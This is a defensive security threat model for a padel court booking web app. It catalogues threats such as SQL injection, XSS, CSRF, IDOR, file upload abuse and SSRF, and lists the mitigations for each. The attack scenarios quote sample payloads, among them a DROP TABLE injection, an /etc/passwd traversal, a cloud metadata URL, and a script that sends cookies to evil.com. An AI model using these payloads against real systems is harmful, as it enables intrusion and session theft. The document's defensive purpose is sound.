# Security Threat Model
## The Field — Padel Court Booking Website
**Version:** 1.0  
**Date:** August 31, 2026  
**Status:** Approved for Implementation

---

## 1. Threat Modeling Approach

This document uses a STRIDE-inspired approach (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) combined with OWASP Top 10 mapping. Each threat is assessed for likelihood, impact, and mitigation status.

**Assets to protect:**
1. Customer personal data (name, phone number).
2. Payment proof files (financial documents).
3. Booking records and their financial data (prices, statuses).
4. Administrator credentials and sessions.
5. Venue business data (pricing, schedules, revenue).
6. System integrity (booking availability, no double-bookings).

**Trust boundaries:**
- Public internet → NGINX → Next.js application
- Next.js application → PostgreSQL database
- Next.js application → Object storage
- Admin browser → /admin/** routes

---

## 2. Threat Catalog

### T-001: SQL Injection
**Category:** Tampering / Information Disclosure  
**OWASP:** A03:2021 Injection  
**Likelihood:** Medium (common attack vector)  
**Impact:** Critical (full database access)

**Attack scenario:** Attacker submits `'; DROP TABLE bookings; --` in a booking form field or URL parameter.

**Mitigations:**
- Drizzle ORM uses parameterized queries exclusively.
- Raw SQL (used for locking queries) uses explicit parameter binding: `sql`SELECT ... WHERE id = ${param}`` with Drizzle's tagged template literal.
- Zod schema validation rejects inputs that don't conform to expected types before they reach the query layer.
- PostgreSQL application role (`app_user`) has no DROP, TRUNCATE, or DDL permissions.

**Residual risk:** Low.

---

### T-002: Cross-Site Scripting (XSS)
**Category:** Tampering / Information Disclosure  
**OWASP:** A03:2021 Injection  
**Likelihood:** Medium  
**Impact:** High (session hijacking, defacement, credential theft)

**Attack scenario:** Attacker submits a customer name like `<script>document.location='https://evil.com?c='+document.cookie</script>`. This name is stored and later rendered in the admin dashboard.

**Mitigations:**
- React's JSX escapes all string values by default. `{customerName}` renders as text, never executes as HTML.
- CMS "About" body field uses server-side HTML sanitization before storage (sanitize-html library with a strict allowlist: `b`, `i`, `ul`, `ol`, `li`, `a`, `p`, `h2`, `h3`).
- `Content-Security-Policy` header blocks inline script execution from unexpected sources.
- `X-Content-Type-Options: nosniff` prevents MIME-type sniffing attacks.
- Admin dashboard uses `dangerouslySetInnerHTML` only where explicitly required (CMS preview) and always with sanitized content.

**Residual risk:** Low.

---

### T-003: Cross-Site Request Forgery (CSRF)
**Category:** Tampering  
**OWASP:** A01:2021 Broken Access Control  
**Likelihood:** Medium  
**Impact:** High (admin actions performed without consent)

**Attack scenario:** Attacker tricks an admin into clicking a link that submits a form to `/api/v1/admin/bookings/123/approve` with the admin's active session cookie.

**Mitigations:**
- Session cookie uses `SameSite=Lax`. For cross-origin requests (from evil.com), the browser will not attach the cookie on POST.
- All mutation API routes require `Content-Type: application/json` or `multipart/form-data` sent by JavaScript's `fetch` — which browser HTML forms cannot fake cross-origin.
- An `X-Requested-With: XMLHttpRequest` custom header check on all mutation routes. This header cannot be set by a cross-origin HTML form submission.
- CSRF token for the customer booking form (a nonce in a signed cookie, verified server-side).

**Residual risk:** Low.

---

### T-004: Insecure Direct Object Reference (IDOR)
**Category:** Information Disclosure  
**OWASP:** A01:2021 Broken Access Control  
**Likelihood:** High (if not explicitly addressed)  
**Impact:** High (customer accesses another customer's booking; admin accesses other venue's data)

**Attack scenario A:** Customer A knows their booking ID is `uuid-1`. They change the URL to `uuid-2` to access Customer B's booking.

**Attack scenario B:** Admin from Venue A queries `/api/v1/admin/bookings` and, by manipulating request parameters, retrieves Venue B's bookings.

**Mitigations:**
- Customer-facing booking queries require an authenticated customer session and filter by the session's customer account ID; changing a reference or URL cannot cross that ownership boundary.
- Customer-facing API never exposes internal UUIDs. Only the booking reference (human-readable, non-sequential) is shared.
- All admin queries are scoped to `venue_id` derived from the server-side environment variable, not from the client request. No admin parameter can override the venue scope.
- Admin booking detail route loads the booking and verifies `booking.venue_id === server_venue_id` before returning data.

**Residual risk:** Low.

---

### T-005: Broken Authentication
**Category:** Spoofing  
**OWASP:** A07:2021 Identification and Authentication Failures  
**Likelihood:** Medium  
**Impact:** Critical (admin account takeover)

**Attack scenario:** Attacker brute-forces admin login credentials.

**Mitigations:**
- Rate limiting: 5 failed login attempts per IP per 15 minutes, then IP is blocked for 15 minutes.
- Constant-time error responses: "Invalid email or password" regardless of whether email exists.
- bcrypt with cost factor 12: ~400ms per comparison makes brute-force impractical.
- Session timeout: 8-hour idle expiry.
- `sessions_invalidated_at` allows immediate session revocation for compromised accounts.
- No "remember me" functionality in V1.

**Residual risk:** Low-Medium (no MFA in V1 is a gap; documented as future requirement).

---

### T-006: Privilege Escalation
**Category:** Elevation of Privilege  
**OWASP:** A01:2021 Broken Access Control  
**Likelihood:** Low  
**Impact:** Critical  

**Attack scenario:** An `admin`-role user crafts a request to create a new account with `super_admin` role, bypassing UI restrictions.

**Mitigations:**
- All permission checks happen server-side at the service layer, not the UI layer.
- `manage_admins` permission is required for all admin account management operations.
- Role assignments are validated against the permission list for the requesting admin's role.
- An admin cannot assign a role with more permissions than their own role.
- All admin management actions are audit-logged.

**Residual risk:** Low.

---

### T-007: Price Manipulation
**Category:** Tampering  
**Likelihood:** High (easy to attempt via browser dev tools)  
**Impact:** High (financial loss to venue)

**Attack scenario:** Customer intercepts the booking request, changes `priceAmount: 400` to `priceAmount: 1`, and submits.

**Mitigations:**
- The booking submission API accepts NO price field from the client.
- Price is calculated entirely server-side from the database's `court_pricing_rules`.
- The server-calculated price is stored on the booking record.
- The admin sees the stored price when reviewing; any manipulation attempt results in the correct price being stored.
- The booking reference confirmation screen shows the server-calculated price.

**Residual risk:** None (price is not a client-controlled field).

---

### T-008: Booking Status Manipulation
**Category:** Tampering  
**Likelihood:** Medium  
**Impact:** High (self-approving bookings, bypassing payment)

**Attack scenario:** Customer submits `{ status: "approved" }` in the booking request body.

**Mitigations:**
- Booking status is never accepted from the client. It is always set server-side.
- The booking status machine (`assertTransitionAllowed`) enforces all transitions.
- Customer-facing API routes cannot perform admin actions (separate route namespace, separate permission model).
- Approval requires admin session + `approve_booking` permission, validated at every approval endpoint.

**Residual risk:** None.

---

### T-009: Payment Verification Bypass
**Category:** Tampering / Elevation of Privilege  
**Likelihood:** Medium  
**Impact:** Critical (confirmed bookings without payment)

**Attack scenario A:** Customer attempts to call `/api/v1/admin/bookings/123/approve` without an admin session.
**Attack scenario B:** Customer uploads a proof then directly modifies payment_status in a request.

**Mitigations:**
- All admin routes require a valid iron-session cookie scoped to `/admin`. Customer-facing routes have no access to admin endpoints.
- Payment status is never accepted from any client (admin or customer) via request body — only set internally by service functions.
- Payment verification (`verify_payment` permission) and booking approval (`approve_booking` permission) are separate from booking creation.

**Residual risk:** None.

---

### T-010: Malicious File Upload
**Category:** Tampering  
**OWASP:** A04:2021 Insecure Design  
**Likelihood:** Medium  
**Impact:** High (remote code execution, stored XSS)

**Attack scenario A:** Customer uploads a PHP file disguised as a JPEG: `proof.php` with `Content-Type: image/jpeg`.
**Attack scenario B:** Customer uploads an SVG file containing embedded JavaScript.
**Attack scenario C:** Customer uploads a 500MB file causing a denial of service.

**Mitigations:**
- File type is validated using magic bytes (first bytes of the file), not the Content-Type header or file extension.
- Allowed types: `image/jpeg`, `image/png`, `application/pdf`. SVG is explicitly excluded.
- Maximum file size: 10MB, enforced before reading the full file body.
- Files are stored in object storage (S3/R2), never in the web server's filesystem.
- Object storage does not execute files. A stored PHP file is served as raw bytes, never executed.
- Generated storage keys have safe extensions (`.jpg`, `.png`, `.pdf`) regardless of original filename.
- PDFs: in V1, PDFs are accepted but not rendered inline (admin downloads/opens separately). Future: consider PDF sanitization.

**Residual risk:** Low (no execution path exists; SVG XSS prevented by exclusion).

---

### T-011: Path Traversal
**Category:** Information Disclosure  
**OWASP:** A01:2021 Broken Access Control  
**Likelihood:** Low  
**Impact:** High (reading server files)

**Attack scenario:** Attacker submits `../../../etc/passwd` as a file reference.

**Mitigations:**
- Storage keys are generated server-side (ULID-based). No user-supplied input forms any part of the storage key.
- Local disk fallback (development only) uses `path.resolve` and asserts the resolved path is within `LOCAL_STORAGE_PATH` before reading.

**Residual risk:** None.

---

### T-012: Race Condition — Double Booking
**Category:** Tampering  
**Likelihood:** Medium (concurrent users)  
**Impact:** High (two confirmed bookings for same slot)

**Attack scenario:** Two customers simultaneously submit valid booking requests for the same court and time slot.

**Mitigations:**
- Booking insertion uses `SERIALIZABLE` isolation level with `SELECT FOR UPDATE` to serialize concurrent inserts.
- PostgreSQL exclusion constraint `no_overlapping_approved_bookings` provides a hard database-level guard even if application logic has a bug.
- The second concurrent request receives a clear "slot no longer available" error (HTTP 409).

**Residual risk:** None (enforced at database constraint level).

---

### T-013: Booking Reference Enumeration
**Category:** Information Disclosure  
**Likelihood:** Medium  
**Impact:** Medium (leaking booking existence, approximate booking volume)

**Attack scenario:** Attacker iterates booking references `TF-20260905-0001` through `TF-20260905-9999` to discover confirmed bookings and customer data.

**Mitigations:**
- Booking references use 4 random alphanumeric characters (excluding ambiguous chars), giving 32^4 = 1,048,576 combinations per day. Brute force is impractical.
- The status lookup endpoint requires the owning customer's authenticated session. Knowledge of the reference alone returns nothing.
- Rate limiting: 10 lookups per customer account per 10 minutes.
- The status lookup response returns minimal data (no phone numbers, no admin notes, no internal IDs).

**Residual risk:** Low.

---

### T-014: Session Hijacking
**Category:** Spoofing  
**OWASP:** A07:2021  
**Likelihood:** Low (requires HTTPS)  
**Impact:** Critical (full admin access)

**Attack scenario:** Attacker intercepts the session cookie over an insecure connection.

**Mitigations:**
- All traffic is HTTPS. HTTP redirects to HTTPS (HSTS enforced).
- Session cookie: `Secure` flag (only sent over HTTPS), `HttpOnly` (not accessible via JavaScript), `SameSite=Lax`.
- iron-session encrypts the cookie content — even if obtained, the content cannot be forged without the SESSION_SECRET.
- Session has an 8-hour maximum lifetime.

**Residual risk:** Low.

---

### T-015: Server-Side Request Forgery (SSRF)
**Category:** Information Disclosure  
**OWASP:** A10:2021 SSRF  
**Likelihood:** Low  
**Impact:** Medium (internal network access, cloud metadata)

**Attack scenario:** An admin uploads a "map embed URL" containing `http://169.254.169.254/latest/meta-data/` (AWS metadata endpoint).

**Mitigations:**
- Map embed URL is a CMS field that is embedded using a sandboxed `<iframe>` in the HTML. The server never makes an HTTP request to this URL.
- No user-supplied URLs are fetched server-side in V1.
- If future features require server-side URL fetching, implement URL allowlisting and block private IP ranges.

**Residual risk:** Low.

---

### T-016: Secrets Exposure
**Category:** Information Disclosure  
**OWASP:** A02:2021 Cryptographic Failures  
**Likelihood:** Medium (developer error)  
**Impact:** Critical (database credentials, session secret, storage keys)

**Attack scenario:** Developer accidentally commits `.env` file containing `DATABASE_URL` to GitHub.

**Mitigations:**
- `.env*` added to `.gitignore` from project creation.
- Pre-commit hook using `git-secrets` or `detect-secrets` scans staged files for secrets patterns.
- CI pipeline runs `truffleHog` or `gitleaks` to scan commit history.
- All secrets are in environment variables; `.env.example` shows keys with placeholder values.
- GitHub repository is **private**. No public access.
- Hostinger environment variables are set in the server environment, not in files.

**Residual risk:** Low-Medium (dependent on developer discipline; tooling reduces but does not eliminate risk).

---

### T-017: Denial of Service (Resource Exhaustion)
**Category:** Denial of Service  
**OWASP:** A05:2021 Security Misconfiguration  
**Likelihood:** Medium  
**Impact:** Medium (site unavailability during attack)

**Attack scenario:** Attacker sends 10,000 booking submission requests per second, exhausting database connections.

**Mitigations:**
- NGINX rate limiting per IP (first line of defense, does not touch the application).
- Application-level rate limiting per IP (second line of defense).
- PostgreSQL connection pool (Drizzle uses `pg` pool, max connections configurable).
- PM2 process manager restarts the application if it crashes.
- Large file upload protection: connection-level size limits in NGINX before multipart parsing.

```nginx
# NGINX config
client_max_body_size 12m;   # slightly above our 10MB limit
limit_req_zone $binary_remote_addr zone=booking:10m rate=10r/m;
limit_req_zone $binary_remote_addr zone=general:10m rate=60r/m;
```

**Residual risk:** Medium (no DDoS protection service like Cloudflare in V1 baseline; consider adding).

---

### T-018: Sensitive Data in Logs
**Category:** Information Disclosure  
**Likelihood:** Medium (developer error)  
**Impact:** Medium

**Attack scenario:** Developer logs the full request body which includes `customerPhone` and booking details. Logs are accessible to anyone with VPS access.

**Mitigations:**
- Structured logging configuration explicitly excludes sensitive fields: `phone`, `password`, `paymentProof`, `storageKey`.
- Log sanitizer middleware strips sensitive keys before logging request bodies.
- Logs are written to files on the VPS with restricted read permissions (app user only).
- In future, logs shipped to a log management service (Logtail, Datadog) must also sanitize before shipping.

**Residual risk:** Low.

---

## 3. OWASP Top 10 Mapping

| OWASP Category | Status | Primary Threat IDs |
|---------------|--------|-------------------|
| A01: Broken Access Control | Addressed | T-004, T-006, T-008, T-009 |
| A02: Cryptographic Failures | Addressed | T-016, T-014 |
| A03: Injection | Addressed | T-001, T-002 |
| A04: Insecure Design | Addressed | T-007, T-012 |
| A05: Security Misconfiguration | Addressed | T-017 |
| A06: Vulnerable Components | Mitigated (npm audit CI) | — |
| A07: Auth & Session Failures | Addressed | T-005, T-014 |
| A08: Software Integrity Failures | Mitigated (Semgrep CI, dependency scan) | — |
| A09: Logging & Monitoring Failures | Addressed | T-018, Sentry |
| A10: SSRF | Addressed | T-015 |

---

## 4. Security Testing Plan

| Tool | Purpose | Frequency |
|------|---------|-----------|
| `npm audit` | Dependency vulnerability scan | Every CI build |
| `Semgrep` (security ruleset) | Static code analysis | Every CI build |
| `OWASP ZAP` (baseline scan) | Automated web vulnerability scan | Pre-production release |
| `Burp Suite` (manual) | Manual penetration testing of booking flow, admin, uploads | Pre-launch |
| `gitleaks` | Secret scanning in git history | Every push to main |
| `axe-core` (Playwright) | Accessibility violations | Every E2E test run |
| Manual IDOR testing | Attempt cross-customer booking access | Pre-launch |

---

## 5. Security Responsibility Matrix

| Responsibility | Owner |
|---------------|-------|
| Application security (code) | Developer |
| NGINX configuration | Developer / DevOps |
| TLS certificate renewal | Hostinger (auto via Let's Encrypt) or Developer |
| Secret rotation | Developer / Venue Owner |
| Dependency updates | Developer (monthly review) |
| Admin account security (password hygiene) | Venue Administrator |
| Suspicious booking review | Venue Administrator |
| Incident response | Developer + Venue Owner |
